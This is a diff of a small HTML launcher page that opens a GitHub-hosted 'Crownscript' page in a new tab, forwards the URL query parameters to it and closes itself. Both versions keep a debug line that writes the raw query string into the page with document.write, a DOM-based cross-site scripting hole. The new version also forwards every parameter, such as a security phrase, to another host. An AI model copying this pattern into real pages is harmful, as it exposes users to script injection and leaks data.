@@ -4,42 +4,36 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Launching...</title>
-    <script>
-        // Debug: Display received parameters
-        document.write("<p>Debug URL Parameters: " + window.location.search + "</p>");
+ <script>
+    // Debug: Show received URL parameters
+    document.write("<p>Debug URL Parameters: " + window.location.search + "</p>");
 
-        function openPopup() {
-            let targetURL = "https://paulpccu.github.io/Crownscript/posat4t.html"; // Update this to the actual page
-            let params = new URLSearchParams(window.location.search);
+    function openPopup() {
+        let targetURL = "https://paulpccu.github.io/Crownscript/posat4t.html";
+        let params = new URLSearchParams(window.location.search);
 
-            // Create an array to store parameters
-            let queryParams = [];
-
-            if (params.has("first_name")) {
-                queryParams.push("first_name=" + encodeURIComponent(params.get("first_name")));
-            }
-            if (params.has("last_name")) {
-                queryParams.push("last_name=" + encodeURIComponent(params.get("last_name")));
-            }
-            if (params.has("security_phrase")) {
-                queryParams.push("amount=" + encodeURIComponent(params.get("security_phrase")));
-            }
-
-            // Append parameters to the target URL if any exist
-            if (queryParams.length > 0) {
-                targetURL += "?" + queryParams.join("&");
-            }
-
-            // Open in a new tab
-            window.open(targetURL, "_blank");
-
-            // Close the popup page itself after 1 second
-            setTimeout(() => window.close(), 1000);
+        // Pass all received parameters to the new window
+        let queryParams = [];
+        for (let [key, value] of params.entries()) {
+            queryParams.push(key + "=" + encodeURIComponent(value));
         }
 
-        // Execute on page load
-        window.onload = openPopup;
-    </script>
+        // Append parameters to the target URL
+        if (queryParams.length > 0) {
+            targetURL += "?" + queryParams.join("&");
+        }
+
+        // Open in a new tab
+        window.open(targetURL, "_blank");
+
+        // Close the popup page itself after 1 second
+        setTimeout(() => window.close(), 1000);
+    }
+
+    // Execute on page load
+    window.onload = openPopup;
+</script>
+
 </head>
 <body>
     <p>If the popup didn't open, please allow popups for this site.</p>
